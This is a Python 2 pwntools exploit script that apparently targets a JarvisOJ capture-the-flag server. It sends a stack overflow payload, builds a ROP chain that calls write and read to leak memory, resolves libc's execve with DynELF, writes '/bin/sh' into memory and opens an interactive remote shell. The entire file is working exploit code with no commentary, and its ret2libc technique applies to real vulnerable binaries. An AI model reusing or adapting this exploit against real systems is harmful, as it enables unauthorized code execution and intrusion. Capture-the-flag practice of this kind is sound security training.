#!/usr/bin/env python2
from pwn import *

jmp_write_addr = 0x08048340
jmp_read_addr = 0x08048310
vulnerable_function_addr = 0x0804844B

conn = remote('pwn2.jarvisoj.com', 9880)

def ReadBytes(address, size):
    conn.send_raw('A' * 0x88 + 'fuck' + 
                  pack(jmp_write_addr, 32) + pack(vulnerable_function_addr, 32) + pack(1, 32) + pack(address, 32) + pack(size, 32))
    recv = conn.read(size)
    log.info('@0x%08x, read: %s' % (address, repr(recv)))
    return recv

def WriteBytes(address, bs):
    conn.send_raw('A' * 0x88 + 'fuck' +
                  pack(jmp_read_addr, 32) + pack(vulnerable_function_addr, 32) + pack(0, 32) + pack(address, 32) + pack(len(bs), 32))
    conn.send_raw(bs)
    log.info('@0x%08x, write: %s' % (address, repr(bs)))

def Leaker(address):
    return ReadBytes(address, 4)

dynelf = DynELF(Leaker, 0x08048470)
libc_base_addr = dynelf.lookup(None, 'libc')
libc_execve_addr = dynelf.lookup('execve', 'libc')
log.info('libc_base_addr = 0x%08x' % libc_base_addr)
log.info('libc_execve_addr = 0x%08x' % libc_execve_addr)

# write "/bin/sh"
WriteBytes(0x0804A02C, '/bin/sh\x00')

# execve("/bin/sh", 0, 0)
conn.send_raw('A' * 0x88 + 'fuck' + 
              pack(libc_execve_addr, 32) + pack(vulnerable_function_addr, 32) + pack(0x0804A02C, 32) + pack(0, 32) + pack(0, 32))

# get shell
conn.interactive()

